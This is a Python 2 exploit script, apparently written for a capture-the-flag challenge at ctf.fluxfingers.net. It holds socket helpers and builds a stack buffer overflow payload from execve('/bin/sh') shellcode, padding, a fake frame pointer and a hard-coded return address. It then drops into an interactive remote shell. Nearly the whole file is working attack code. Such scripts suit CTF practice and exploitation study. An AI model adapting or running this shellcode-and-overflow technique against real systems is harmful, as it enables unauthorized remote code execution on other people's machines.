#! /usr/local/pyenv/shims/python
# _*_ coding: utf-8 _*_
import struct, socket, sys, os
import time, telnetlib, hexdump

# -------- common function --------
def sock(host, port):
  s = socket.create_connection((host, port))
  return s, s.makefile('rw', bufsize=0)

def read_until(f, delm='\n'):
  data = ''
  while not data.endswith(delm):
    data += f.readline()
  return data

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

def p(a):
  return struct.pack("<I", a&0xffffffff)

def u(a):
  return struct.unpack("<I", a)[0]

def xxd(a):
  hexdump.hexdump(a)

def countdown(n):
  for i in xrange(n, 0, -1):
    print str(i) + "..",
    sys.stdout.flush()
    time.sleep(1)
  print

def dbg(ss):
  print "[+] %s: 0x%x"%(ss, eval(ss))

# ------------- main --------------

if sys.argv[1] == 'r':
  HOST, PORT = "ctf.fluxfingers.net", 1340
else:
  HOST, PORT = "localhost", 1025

s, f = sock(HOST, PORT)

sc =  "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e"
sc += "\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89"
sc += "\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

print "[*] send payload"
payload = sc                                  # sc
payload += payload.ljust(0x40)                # add padding
payload += "deadbeef"                         # RBP
payload += "\x68\xde\xff\xff\xff\xff\xff\x07" # Addres of buf(0x7fffffffde68)

f.write(payload)

shell(s)
